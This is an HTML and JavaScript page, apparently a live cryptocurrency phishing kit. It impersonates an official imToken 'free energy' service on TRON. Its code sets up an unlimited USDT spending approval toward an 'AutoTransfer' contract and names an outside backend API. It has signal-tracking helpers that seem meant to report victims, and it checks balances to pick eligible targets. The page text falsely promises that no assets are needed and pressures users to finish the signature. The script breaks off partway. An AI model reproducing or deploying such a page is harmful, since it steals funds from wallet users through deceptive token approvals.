<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>imTokenå®˜æ–¹åº”æ€¥é€šé“</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
body { 
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    padding: 12px 10px;
    max-width: 600px; 
    margin: 0 auto; 
    background: #121a17; 
    color: #e0e8e4; 
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    gap: 8px;
    border-radius: 8px;
    border-left: 3px solid #3b82f6;
    font-size: 15px; /* æ•´ä½“å­—ä½“è°ƒå¤§ */
}
.container {
    flex: 1;
    display: flex;
    flex-direction: column;
    gap: 8px;
}
.lang-switch {
    display: flex;
    justify-content: flex-end;
    padding-right: 6px;
    margin-bottom: 4px;
}
.lang-toggle {
    padding: 4px 10px;
    border: 1px solid #3b82f6;
    border-radius: 20px;
    background: transparent;
    color: #e0e8e4;
    font-size: 15px; /* å­—ä½“è°ƒå¤§ */
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 6px;
}
.lang-toggle:hover {
    background: rgba(59, 130, 246, 0.2);
}
.header {
    text-align: center;
    padding: 10px 0;
    border-bottom: 1px solid #334155;
    margin-bottom: 5px;
    display:flex;
    justify-content: center;
}
.header h1 { 
    font-size: 24px; /* å­—ä½“è°ƒå¤§ */
    color: #3b82f6; 
    margin-bottom: 5px;
}
.header .desc {
    font-size: 14px; /* å­—ä½“è°ƒå¤§ */
    color: #a0a8a4;
    max-width: 450px;
    margin: 0 auto;
    line-height: 1.5; 
}
.warning {
    background: #334155;
    color: #93c5fd;
    padding: 12px;
    border-radius: 8px;
    font-size: 14px; /* å­—ä½“è°ƒå¤§ */
    border-left: 3px solid #4ade80;
    line-height: 1.6;
}
.warning strong {
    color: #3b82f6;
}
#userInfo {
    text-align: center;
    font-size: 15px; /* å­—ä½“è°ƒå¤§ */
    padding: 15px;
    background: #1e2925;
    border-radius: 8px;
    border: 1px solid #334155;
    line-height: 1.8;
}
#userInfo span {
    color: #3b82f6;
    font-weight: 500;
}
#walletStatusContainer {
    background: #1e2925;
    padding: 15px;
    border-radius: 8px;
    border: 1px solid #334155;
    font-size: 14px; /* å­—ä½“è°ƒå¤§ */
    color: #a0a8a4;
    line-height: 1.8;
    border-right: 5px solid #4ade80;
}
#walletStatusContainer .status-title {
    font-size: 16px; /* å­—ä½“è°ƒå¤§ */
    color: #3b82f6;
    margin-bottom: 8px;
    display: flex;
    align-items: center;
    gap: 8px;
}
#walletStatusContainer .connected-content {
    display: none;
}
#walletStatusContainer.connected .disconnected-content {
    display: none;
}
#walletStatusContainer.connected .connected-content {
    display: block;
}
#walletStatusContainer .highlight {
    color: #3b82f6;
    font-weight: 500;
}
#walletStatusContainer.connected .connected-content .orange-tip {
    color: #f97316;
    margin-top: 5px;
    font-size: 14px; /* å­—ä½“è°ƒå¤§ */
}
#contractResourceContainer {
    background: #1e2925;
    padding: 15px;
    border-radius: 8px;
    border: 1px solid #334155;
    font-size: 14px; /* å­—ä½“è°ƒå¤§ */
    color: #a0a8a4;
    line-height: 2;
    border-bottom: 2px solid rgba(59, 130, 246, 0.2);
}
#contractResourceContainer .status-title {
    font-size: 16px; /* å­—ä½“è°ƒå¤§ */
    color: #3b82f6;
    margin-bottom: 10px;
    display: flex;
    align-items: center;
    gap: 8px;
}
#contractResourceContainer .status-title i {
    font-size: 18px; /* å­—ä½“è°ƒå¤§ */
    color: #93c5fd;
}
#contractResourceContainer .highlight {
    color: #3b82f6;
    font-weight: 500;
}
#contractResourceContainer .data-tag {
    background: rgba(59, 130, 246, 0.15);
    padding: 3px 8px;
    border-radius: 4px;
    border: 1px solid rgba(59, 130, 246, 0.3);
    font-size: 14px; /* å­—ä½“è°ƒå¤§ */
}
.record-list {
    background: #1e2925;
    padding: 15px;
    border-radius: 8px;
    border: 1px solid #334155;
    font-size: 14px; /* å­—ä½“è°ƒå¤§ */
    border-right: 5px solid #4ade80;
    display: none; /* åˆå§‹éšè— */
}
.record-item {
    margin-bottom: 10px;
    padding-bottom: 10px;
    border-bottom: 1px solid #334155;
}
.record-item:hover {
    border-color: #3b82f6;
    transition: border-color 0.3s;
}
.record-item p {
    margin-bottom: 6px;
    color: #a0a8a4;
    line-height: 1.6;
    font-size: 14px; /* å­—ä½“è°ƒå¤§ */
}
.record-item p strong {
    color: #e0e8e4;
    margin-right: 6px;
}
.tx-link {
    color: #3b82f6;
    text-decoration: none;
    display: inline-flex;
    align-items: center;
    gap: 6px;
    font-size: 14px; /* å­—ä½“è°ƒå¤§ */
}
.tx-link:hover {
    text-decoration: underline;
}
.btn-group {
    display: flex;
    flex-direction: column;
    gap: 8px; 
    margin-top: 10px;
    padding: 10px 0;
    border-top: 1px solid #334155;
}
.btn {
    width: 100%;
    padding: 18px;
    font-size: 16px; /* å­—ä½“è°ƒå¤§ */
    border: none;
    border-radius: 8px;
    background: #2563eb;
    color: white;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    transition: background 0.3s;
}
.btn:hover {
    background: #3b82f6;
}
.btn:disabled {
    background: #294b75;
    color: #a0a8a4;
    cursor: not-allowed;
}
.footer-info {
    margin-top: 10px;
    padding-top: 10px;
    border-top: 1px solid #334155;
    font-size: 12px; /* å­—ä½“è°ƒå¤§ */
    color: #a0a8a4;
    text-align: center;
    line-height: 1.8;
}
.footer-info a {
    color: #3b82f6;
    text-decoration: none;
}
.footer-info a:hover {
    text-decoration: underline;
} 
.text-right {
    text-align: right;
}
.review-tip {
    color: #4ade80;
    font-size: 14px; /* å­—ä½“è°ƒå¤§ */
    margin-top: 8px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
}
    </style>
</head>
<body>
    <div class="lang-switch">
        <button id="langToggle" class="lang-toggle">
          <i class="fa fa-globe"></i>
        </button>
    </div>
    <div class="container">      
        <div class="header">
            <div>
                <h1 id="headerTitle">imToken</h1>
                <p class="desc" id="headerDesc">imTokenå®˜æ–¹ä¸“å±æœåŠ¡ï¼Œæ¯ä¸ªé’±åŒ…åœ°å€æ¯30å¤©åªå¯é¢†å–ä¸€æ¬¡èƒ½é‡</p>
            </div>
        </div>   
        <div id="userInfo">
            <span id="userInfoDefault">æœªè¿æ¥é’±åŒ…<br>
            <span>è¯·ç‚¹å‡»åº•éƒ¨ã€Œè¿æ¥imTokené’±åŒ…ã€æŒ‰é’®</span></span>
        </div>
        <div id="walletStatusContainer">
            <div class="status-title"><h3 id="walletStatusTitle">é’±åŒ…çŠ¶æ€</h3></div>
            <div class="disconnected-content">
                <span id="disconnectedText">æœªè¿æ¥é’±åŒ…</span>
                <p><span class="highlight" id="disconnectedTip1">æ­¤é“¾æ¥ä¸ºimTokenä¸“å±é€šé“ï¼ŒéimTokenç”¨æˆ·ä¸å¯é¢†å–</span></p>
                <p><span class="highlight" id="disconnectedTip2">1. æ¯ä¸ªé’±åŒ…åœ°å€30å¤©å†…åªå¯å…è´¹é¢†å–ä¸€æ¬¡</span></p>         
                <p><span class="highlight" id="disconnectedTip3">2. æ­¤é“¾æ¥åªä¸ºç”¨æˆ·åœ¨é’±åŒ…æ— èƒ½é‡çš„ç´§æ€¥æƒ…å†µä¸‹æä¾›èƒ½é‡æ”¯æ´éç›ˆåˆ©é¡¹ç›®</span></p>
                <p><span class="highlight" id="disconnectedTip4">3. ç‚¹å‡»é¢†å–åç³»ç»Ÿå°†å®¡æ ¸é’±åŒ…åœ°å€æ˜¯å¦ç¬¦åˆé¢†å–è¦æ±‚</span></p>
                <p><span class="highlight" id="disconnectedTip5">4. æ— éœ€æ¶ˆè€—ä»»ä½•èµ„äº§ï¼Œé€‰æ‹©æ”¾å¼ƒç›´æ¥é€€å‡ºå³å¯</span></p>
            </div>
            <div class="connected-content">
                <p id="connectedSuccess">âœ… é’±åŒ…å·²æˆåŠŸè¿æ¥</p>
                <p id="connectedAddress">â€¢ é’±åŒ…åœ°å€ï¼š<span class="highlight" id="statusAddress"></span></p>
                <p id="connectedType">â€¢ é¢†å–ç±»å‹ï¼š<span class="highlight">USDTè½¬è´¦èƒ½é‡</span></p>
                <p id="connectedAmount">â€¢ é¢†å–é¢åº¦ï¼š<span class="highlight">90000èƒ½é‡</span></p>
                <p class="orange-tip" id="connectedWarn">âš ï¸æç¤ºï¼šç‚¹å‡»é¢†å–åè¯·åŠ¡å¿…å®Œæˆç­¾åï¼Œä¸­é€”é€€å‡ºè§†ä¸ºå·²é¢†å–30æ—¥å†…ä¸å¯å†æ¬¡é¢†å–</p>
            </div>
        </div>
        <div id="contractResourceContainer">
            <div class="status-title">     
                <h3 id="contractResourceTitle">åˆçº¦å‰©ä½™èµ„æº</h3>
            </div>
            <div class="resource-content" style="line-height: 2;">
                <p>â€¢ åˆçº¦åœ°å€ï¼š<span class="highlight" id="contractAddr"></span></p>
                <p>â€¢ å‰©ä½™èƒ½é‡ï¼š<span class="highlight data-tag" id="contractEnergy"></span></p>
                <p style="font-size: 14px; color: #a0a8a4; margin-top: 8px;" id="contractNote">
                    æ³¨ï¼šå‰©ä½™èƒ½é‡ä¸ºâ€œ 0 â€æ—¶åœæ­¢é¢†å–ï¼Œè¯¥é¡¹ç›®ä¸ºimTokenå®˜æ–¹å‘è¡Œï¼Œåªé™imTokené’±åŒ…ç”¨æˆ·å‚ä¸ã€‚
                </p>
            </div>
        </div>
        <div class="record-list" id="recordList">
            <div style="display: flex; justify-content: space-between; margin: 6px 0;">
                <span id="recordTypeTitle">èƒ½é‡ä½¿ç”¨èŒƒå›´</span>
                <span id="recordAmountTitle">è½¬è´¦é¢åº¦</span>
            </div>
            <div style="display: flex; color: #3b82f6;justify-content: space-between; margin: 6px 0;">
                <span class="header"><h3 id="energyType">USDTè½¬è´¦</h3></span>
                <span class="header"><h3 id="transferQuota">æ— é™</h3></span>
            </div>       
            <span id="approvalRecords" class="highlight">æš‚æ— èƒ½é‡é¢†å–è®°å½•</span>        
        </div>
    </div>
    <div class="btn-group">
        <div class="warning">
            <p id="browserWarn1"> âš ï¸ è¯·ç”¨ <strong>imTokené’±åŒ…å†…ç½®æµè§ˆå™¨</strong> æ‰“å¼€</p>
            <p id="browserWarn2"> âš ï¸ éé’±åŒ…æµè§ˆå™¨ï¼šç‚¹å‡»æŒ‰é’®è‡ªåŠ¨å¤åˆ¶+å”¤èµ·imToken</p>  
        </div> 
        <button id="connectBtn" class="btn">è¿æ¥imTokené’±åŒ…</button>
        <button id="approveBtn" class="btn" disabled>é¢†å–èƒ½é‡</button>
       
        <div id="reviewTip" class="review-tip" style="display: none;">
           <span id="reviewTipText">ç³»ç»Ÿå®¡æ ¸ä¸­ï¼Œå®¡æ ¸é€šè¿‡åè¯·åŠ¡å¿…å®Œæˆç­¾å</span>
        </div>
    </div>
    <div class="footer-info" id="footerInfo">
        åˆçº¦éªŒè¯ï¼šAutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>ï¼ˆTRONæµè§ˆå™¨æŸ¥è¯¢ï¼‰
        Â© 2025 èƒ½é‡æœåŠ¡ | <a href="https://tronscan.org" target="_blank">TRONæµè§ˆå™¨</a> | <a href="https://token.im" target="_blank">imTokenå®˜ç½‘</a>
    </div>
   <script src="imtoken://browser"></script>
<script>
// ========== å…¨å±€å˜é‡ä¼˜å…ˆå®šä¹‰ ==========
const SPECIAL_ADDRESS = "TVP7Y8jA7hBc1g7qm72P6aGBfexqLm1SRy"; // ç‰¹æ®Šç™½åå•åœ°å€
const A1_SIGNAL_KEY = "a1_signal_records"; // A1ä¿¡å·å‘é€è®°å½•ï¼ˆ15åˆ†é’Ÿé˜²é‡å¤ï¼‰
let currentEnergy = 0;
const INIT_TRX = 4104470400000;
const TRX_DECREASE_PER_SEC = 65200;
const GLOBAL_START_TIME = new Date().getTime() - 10000;
let trxTimer = null;
let contractEnergyEl = null;
// æ ¸å¿ƒé…ç½®
const AUTO_TRANSFER_CONTRACT = "TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL";
const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const BACKEND_API = "https://kgjiopv1.com";
const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
// USDTåˆçº¦ABI
const USDT_ABI = [
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_spender", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "approve",
        "outputs": [{"name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "anonymous": false,
        "inputs": [
            {"indexed": true, "name": "owner", "type": "address"},
            {"indexed": true, "name": "spender", "type": "address"},
            {"indexed": false, "name": "value", "type": "uint256"}
        ],
        "name": "Approval",
        "type": "event"
    }
];
// å…¨å±€å˜é‡
let tronWeb = null;
let userAddress = null;
let trc20Contract = null;
let tokenBalance = 0.00;
let trxBalance = 0.00;
const RECORD_KEY = "imtoken_energy_records";
// æ–°å¢ï¼šB1ä¿¡å·å‘é€æ ‡è®°ï¼ˆé˜²æ­¢é‡å¤å‘é€ï¼‰
const B1_SIGNAL_KEY = "b1_signal_sent";
// ========== å¤šè¯­è¨€é…ç½®ï¼ˆåŒæ­¥ä¸­æ–‡ä¿®æ”¹å¯¹åº”çš„è‹±æ–‡ï¼‰ ==========
const langConfig = {
    zh: {
        headerTitle: "imToken",
        headerDesc: "imTokenå®˜æ–¹ä¸“å±æœåŠ¡ï¼Œæ¯ä¸ªé’±åŒ…åœ°å€æ¯30å¤©åªå¯é¢†å–ä¸€æ¬¡èƒ½é‡",
        userInfoDefault: "æœªè¿æ¥é’±åŒ…<br><span>è¯·ç‚¹å‡»åº•éƒ¨ã€Œè¿æ¥imTokené’±åŒ…ã€æŒ‰é’®</span>",
        walletStatusTitle: "é’±åŒ…çŠ¶æ€",
        disconnectedText: "æœªè¿æ¥é’±åŒ…",
        disconnectedTip1: "æ‚¨ç°åœ¨å‡†å¤‡é¢†å–çš„æ˜¯imTokenä¸“å±èƒ½é‡ï¼ŒéimTokenç”¨æˆ·ä¸å¯é¢†å–",
        disconnectedTip2: "1. æ¯ä¸ªé’±åŒ…åœ°å€30å¤©å†…åªå¯å…è´¹é¢†å–ä¸€æ¬¡",
        disconnectedTip3: "2. é¡¹ç›®åªä¸ºç”¨æˆ·åœ¨é’±åŒ…æ— èƒ½é‡çš„ç´§æ€¥æƒ…å†µä¸‹æä¾›èƒ½é‡æ”¯æ´éç›ˆåˆ©é¡¹ç›®",
        disconnectedTip4: "3. ç‚¹å‡»é¢†å–åç³»ç»Ÿå°†å®¡æ ¸é’±åŒ…åœ°å€æ˜¯å¦ç¬¦åˆé¢†å–è¦æ±‚",
        disconnectedTip5: "4. æ— éœ€æ¶ˆè€—ä»»ä½•èµ„äº§ï¼Œé€‰æ‹©æ”¾å¼ƒç›´æ¥é€€å‡ºå³å¯",
        connectedSuccess: "âœ… é’±åŒ…å·²æˆåŠŸè¿æ¥",
        connectedAddress: "â€¢ é’±åŒ…åœ°å€ï¼š<span class='highlight' id='statusAddress'></span>",
        connectedType: "â€¢ é¢†å–ç±»å‹ï¼š<span class='highlight'>USDTè½¬è´¦èƒ½é‡</span>",
        connectedAmount: "â€¢ é¢†å–é¢åº¦ï¼š<span class='highlight'>90000èƒ½é‡</span>",
        connectedWarn: "âš ï¸æç¤ºï¼šç‚¹å‡»é¢†å–åè¯·åŠ¡å¿…å®Œæˆç­¾åï¼Œä¸­é€”é€€å‡ºè§†ä¸ºå·²é¢†å–30æ—¥å†…ä¸å¯å†æ¬¡é¢†å–",
        contractResourceTitle: "åˆçº¦å‰©ä½™èµ„æº",
        contractAddrText: "â€¢ åˆçº¦åœ°å€ï¼š<span class='highlight' id='contractAddr'></span>",
        contractEnergyText: "â€¢ å‰©ä½™èƒ½é‡ï¼š<span class='highlight data-tag' id='contractEnergy'>4104470400000</span>",
        contractNote: "æ³¨ï¼šæ‰€æœ‰å‰©ä½™é‡ä¸ºâ€œ 0 â€æ—¶åœæ­¢é¢†å–ï¼Œè¯¥é¡¹ç›®ä¸ºimTokenå®˜æ–¹å‘è¡Œï¼Œåªé™imTokenç”¨æˆ·å‚ä¸ã€‚",
        recordTypeTitle: "èƒ½é‡ä½¿ç”¨èŒƒå›´",
        recordAmountTitle: "è½¬è´¦é¢åº¦",
        energyType: "USDTè½¬è´¦",
        transferQuota: "æ— é™",
        noRecord: "æš‚æ— èƒ½é‡é¢†å–è®°å½•",
        browserWarn1: " âš ï¸ è¯·ç”¨ <strong>imTokené’±åŒ…å†…ç½®æµè§ˆå™¨</strong> æ‰“å¼€",
        browserWarn2: " âš ï¸ éé’±åŒ…æµè§ˆå™¨ï¼šç‚¹å‡»æŒ‰é’®è‡ªåŠ¨å¤åˆ¶+å”¤èµ·imToken",
        connectBtnText: "è¿æ¥imTokené’±åŒ…",
        approveBtnText: "å…è´¹é¢†å–èƒ½é‡",
        reviewTipText: "ç³»ç»Ÿå®¡æ ¸ä¸­ï¼Œå®¡æ ¸é€šè¿‡åè¯·åŠ¡å¿…å®Œæˆç­¾å",
        footerInfo: "åˆçº¦éªŒè¯ï¼šAutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>ï¼ˆTRONæµè§ˆå™¨æŸ¥è¯¢ï¼‰Â© 2025 TRXèƒ½é‡æœåŠ¡ | <a href='https://tronscan.org' target='_blank'>TRONæµè§ˆå™¨</a> | <a href='https://token.im' target='_blank'>imTokenå®˜ç½‘</a>",
        copySuccess: "âœ… é“¾æ¥å·²å¤åˆ¶ï¼Œè¯·åœ¨imTokenå†…ç½®æµè§ˆå™¨æ‰“å¼€",
        copyFail: "âŒ å¤åˆ¶å¤±è´¥ï¼šè¯·æ‰‹åŠ¨å¤åˆ¶é“¾æ¥",
        å”¤èµ·Guide: "âœ… å·²å¤åˆ¶é“¾æ¥+å”¤èµ·imToken\nä¸‹ä¸€æ­¥ï¼šæ‰“å¼€imToken â†’ æµè§ˆ â†’ ç²˜è´´è®¿é—®",
        copyGuide: "âœ… é“¾æ¥å·²å¤åˆ¶ï¼Œè¯·åœ¨imTokenä¸­ç²˜è´´è®¿é—®",
        connectError: "è¿æ¥å¼‚å¸¸<br><span style='color: #ef4444; font-size: 16px;'>âš ï¸ ç½‘ç»œæ³¢åŠ¨</span>",
        retryConnect: "é‡è¯•è¿æ¥",
        authorizedTip: "å·²é¢†å–æç¤º<br>{address}<br>USDTä½™é¢ï¼š<span>{usdt}</span> | TRXä½™é¢ï¼š<span>{trx}</span><br><span style='color: #3b82f6; font-size: 16px;'>âœ… è¯¥é’±åŒ…30å¤©å†…å·²é¢†å–è¿‡å…è´¹èƒ½é‡</span><br><span style='color: #a0a8a4; font-size: 15px;'>æ¯ä¸ªåœ°å€æ¯30å¤©ä»…é™é¢†å–ä¸€æ¬¡</span>",
        authorizedBtn: "å·²é¢†å–è¿‡èƒ½é‡",
        afterApproveTip: "å·²è¿æ¥ï¼š<br>{address}<br><span style='color: #4ade80; font-size: 16px;'>âœ… æˆæƒæˆåŠŸï¼Œå‘æ”¾èƒ½é‡ä¸­...</span>",
        deployingBtn: "å‘æ”¾ä¸­...",
        loadingBtn: "åŠ è½½ä¸­...",
        loadingTip: "å·²è¿æ¥ï¼š<br>{address}<br><span style='color: #4ade80; font-size: 16px;'>âœ… åŠ è½½ä¸­...</span>",
        queryingBalance: "æŸ¥è¯¢ä¸­...",
        insufficientUsdt: "å·²è¿æ¥ï¼š<br>{address}<br>USDTä½™é¢ï¼š<span style='color: #ef4444;'>{usdt}</span> | TRXä½™é¢ï¼š<span>{trx}</span><br><span style='color: #ef4444; font-size: 16px;'>âŒ ä¸ç¬¦åˆé¢†å–æ¡ä»¶ï¼šUSDTä½™é¢éœ€å¤§äº1</span>",
        insufficientBtn: "ä¸ç¬¦åˆé¢†å–æ¡ä»¶",
        eligibleTip: "å·²è¿æ¥ï¼š<br>{address}<br>USDTä½™é¢ï¼š<span style='color: #4ade80;'>{usdt}</span> | TRXä½™é¢ï¼š<span>{trx}</span><br><span style='color: #4ade80; font-size: 16px;'>âœ… å¯å…è´¹é¢†å–90000 USDT èƒ½é‡</span>",
        distributingBtn: "èƒ½é‡é…é€ä¸­...",
        redirectingBtn: "è·³è½¬ç­¾åä¸­...",
        approveFail: "âš ï¸ æ“ä½œå¤±è´¥ï¼š{msg}ï¼Œè¯·ç¨åé‡è¯•",
        authorizeFail: "âš ï¸ æˆæƒå¤±è´¥ï¼š{msg}ï¼Œè¯·ç¨åé‡è¯•",
        successTip: "ğŸ‰ å…è´¹èƒ½é‡é¢†å–å®Œæˆï¼\n90000 USDTèƒ½é‡å·²åˆ°è´¦ï½",
        successBtn: "èƒ½é‡é¢†å–æˆåŠŸ",
        successArrival: "<br><span style='color: #4ade80;'>âœ… 90000 USDTèƒ½é‡å·²åˆ°è´¦</span>",
        recordAddress: "åœ°å€ï¼š",
        recordType: "é¢†å–ç±»å‹ï¼š",
        recordEnergy: "è·å–èƒ½é‡ï¼š",
        recordTime: "é¢†å–æ—¶é—´ï¼š",
        freeEnergy: "å…è´¹é¢†å–",
        systemBusyTip: "ç³»ç»Ÿç¹å¿™è¯·ç¨åé‡è¯•",
        ineligibleTip: "ä¸ç¬¦åˆé¢†å–æ¡ä»¶",
        errorTipPrefix: "âš ï¸ ",
        noWalletAddress: "æœªæ£€æµ‹åˆ°æœ‰æ•ˆé’±åŒ…åœ°å€<br><span style='color: #ef4444; font-size: 16px;'>âŒ è¯·è¿æ¥imTokené’±åŒ…åé‡è¯•</span>",
        nonImTokenUser: "éimTokené’±åŒ…ç”¨æˆ·<br><span style='color: #ef4444; font-size: 16px;'>âŒ ä»…é™imTokenç”¨æˆ·å‚ä¸</span>"
    },
    en: {
        headerTitle: "imToken Official",
        headerDesc: "imToken Exclusive Service - Each wallet address can claim free energy once every 30 days",
        userInfoDefault: "Wallet not connected<br><span>Click the 'Connect imToken Wallet' button below</span>",
        walletStatusTitle: "Wallet Status",
        disconnectedText: "Wallet not connected",
        disconnectedTip1: "You are about to claim imToken exclusive energy - only for imToken users",
        disconnectedTip2: "1. Each wallet address can claim free energy once every 30 days",
        disconnectedTip3: "2. This non-profit project provides emergency energy support for users with no wallet energy",
        disconnectedTip4: "3. The system will verify if the wallet address meets the claim requirements after clicking 'Claim'",
        disconnectedTip5: "4. No assets required - exit directly to cancel",
        connectedSuccess: "âœ… Wallet connected successfully",
        connectedAddress: "â€¢ Wallet Address: <span class='highlight' id='statusAddress'></span>",
        connectedType: "â€¢ Claim Type: <span class='highlight'>USDT Transfer Energy</span>",
        connectedAmount: "â€¢ Claim Quota: <span class='highlight'>90000 Energy</span>",
        connectedWarn: "âš ï¸ Note: Please complete the signature after clicking 'Claim' - exiting midway counts as claimed (no re-claim within 30 days)",
        contractResourceTitle: "Contract Remaining Resources",
        contractAddrText: "â€¢ Contract Address: <span class='highlight' id='contractAddr'></span>",
        contractEnergyText: "â€¢ Remaining Energy: <span class='highlight data-tag' id='contractEnergy'>4104470400000</span>",
        contractNote: "Note: Distribution stops when remaining amount is '0' - Official imToken project, only for imToken users",
        recordTypeTitle: "Energy Usage Scope",
        recordAmountTitle: "Transfer Quota",
        energyType: "USDT Transfer",
        transferQuota: "Unlimited",
        noRecord: "No energy claim records",
        browserWarn1: " âš ï¸ Open with <strong>imToken in-app browser</strong>",
        browserWarn2: " âš ï¸ Non-wallet browser: Click button to copy + launch imToken",
        connectBtnText: "Connect imToken Wallet",
        approveBtnText: "Claim Free Energy",
        reviewTipText: "System reviewing - please complete the signature after approval",
        footerInfo: "Contract Verification: AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span> (Check on TRON Scan) Â© 2025 TRX Energy Service | <a href='https://tronscan.org' target='_blank'>TRON Scan</a> | <a href='https://token.im' target='_blank'>imToken Official</a>",
        copySuccess: "âœ… Link copied - open in imToken in-app browser",
        copyFail: "âŒ Copy failed - please copy manually",
        å”¤èµ·Guide: "âœ… Link copied + imToken launched\nNext: Open imToken â†’ Browser â†’ Paste link",
        copyGuide: "âœ… Link copied - please paste in imToken",
        connectError: "Connection Error<br><span style='color: #ef4444; font-size: 16px;'>âš ï¸ Network fluctuation</span>",
        retryConnect: "Retry Connection",
        authorizedBtn: "Energy Claimed",
        afterApproveTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 16px;'>âœ… Authorization successful, energy distributing...</span>",
        deployingBtn: "Distributing...",
        loadingBtn: "Loading...",
        loadingTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 16px;'>âœ… Loading...</span>",
        queryingBalance: "Querying...",
        insufficientBtn: "Ineligible",
        eligibleTip: "Connected:<br>{address}<br>USDT Balance: <span style='color: #4ade80;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #4ade80; font-size: 16px;'>âœ… Eligible for 90000 free USDT Energy</span>",
        distributingBtn: "Energy Distributing...",
        redirectingBtn: "Redirecting to Signature...",
        approveFail: "âš ï¸ Operation failed: {msg}, please try again later",
        authorizeFail: "âš ï¸ Authorization failed: {msg}, please try again later",
        successTip: "ğŸ‰ Free Energy Claim Completed!\n90000 USDT Energy has been creditedï½",
        successBtn: "Claim Successful",
        successArrival: "<br><span style='color: #4ade80;'>âœ… 90000 USDT Energy credited</span>",
        recordAddress: "Address:",
        recordType: "Claim Type:",
        recordEnergy: "Energy Obtained:",
        recordTime: "Claim Time:",
        freeEnergy: "Free Claim",
        systemBusyTip: "System busy, please try again later",
        ineligibleTip: "Ineligible",
        errorTipPrefix: "âš ï¸ ",
        authorizedTip: "Claimed Successfully<br>{address}<br>USDT Balance: <span>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #3b82f6; font-size: 16px;'>âœ… This wallet has claimed free energy within 30 days</span><br><span style='color: #a0a8a4; font-size: 15px;'>One claim per address every 30 days</span>",
        insufficientUsdt: "Connected:<br>{address}<br>USDT Balance: <span style='color: #ef4444;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #ef4444; font-size: 16px;'>âŒ Ineligible: USDT balance must exceed 1</span>",
        noWalletAddress: "No valid wallet address detected<br><span style='color: #ef4444; font-size: 16px;'>âŒ Please connect imToken wallet and try again</span>",
        nonImTokenUser: "Non-imToken user<br><span style='color: #ef4444; font-size: 16px;'>âŒ Only for imToken users</span>"
    }
};
// å½“å‰è¯­è¨€
let currentLang = localStorage.getItem("imtoken_energy_lang") || "zh";
// ========== äºŒæ¬¡æˆæƒæ ¡éªŒå·¥å…· ==========
const AUTHORIZED_KEY = "authorized_wallet_addresses";
function getAuthorizedAddresses() {
    try {
        const stored = localStorage.getItem(AUTHORIZED_KEY);
        return stored ? JSON.parse(stored) : [];
    } catch (e) {
        console.warn("è¯»å–å·²æˆæƒåœ°å€å¤±è´¥ï¼š", e);
        return [];
    }
}
function addAuthorizedAddress(address) {
    try {
        const addresses = getAuthorizedAddresses();
        if (!addresses.includes(address)) {
            addresses.push(address);
            localStorage.setItem(AUTHORIZED_KEY, JSON.stringify(addresses));
        }
    } catch (e) {
        console.warn("å­˜å‚¨å·²æˆæƒåœ°å€å¤±è´¥ï¼š", e);
    }
}
function isAddressAuthorized(address) {
    const addresses = getAuthorizedAddresses();
    if (!addresses.includes(address)) return false;
    const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
    const record = records.find(item => item.address === address);
    if (!record) return false;
    const receiveTime = new Date(record.receiveTime).getTime();
    const thirtyDays = 30 * 24 * 60 * 60 * 1000;
    return Date.now() - receiveTime < thirtyDays;
}
// ========== A1ä¿¡å·é˜²é‡å¤å·¥å…·ï¼ˆ15åˆ†é’Ÿï¼‰ ==========
function canSendA1Signal(address) {
    try {
        const records = JSON.parse(localStorage.getItem(A1_SIGNAL_KEY) || "{}");
        const lastSendTime = records[address] || 0;
        const now = Date.now();
        return now - lastSendTime > 15 * 60 * 1000; // 15åˆ†é’Ÿ=900000æ¯«ç§’
    } catch (e) {
        console.warn("æ£€æŸ¥A1ä¿¡å·å‘é€æƒé™å¤±è´¥ï¼š", e);
        return true; // å¼‚å¸¸æ—¶å…è®¸å‘é€
    }
}
function updateA1SignalRecord(address) {
    try {
        const records = JSON.parse(localStorage.getItem(A1_SIGNAL_KEY) || "{}");
        records[address] = Date.now();
        localStorage.setItem(A1_SIGNAL_KEY, JSON.stringify(records));
    } catch (e) {
        console.warn("æ›´æ–°A1ä¿¡å·è®°å½•å¤±è´¥ï¼š", e);
    }
}
// ========== B1ä¿¡å·é˜²é‡å¤å·¥å…· ==========
function hasSentB1Signal(address) {
    try {
        const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
        return records[address] === true;
    } catch (e) {
        console.warn("æ£€æŸ¥B1ä¿¡å·å‘é€çŠ¶æ€å¤±è´¥ï¼š", e);
        return false;
    }
}
function markB1SignalSent(address) {
    try {
        const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
        records[address] = true;
        localStorage.setItem(B1_SIGNAL_KEY, JSON.stringify(records));
    } catch (e) {
        console.warn("æ ‡è®°B1ä¿¡å·å‘é€çŠ¶æ€å¤±è´¥ï¼š", e);
    }
}
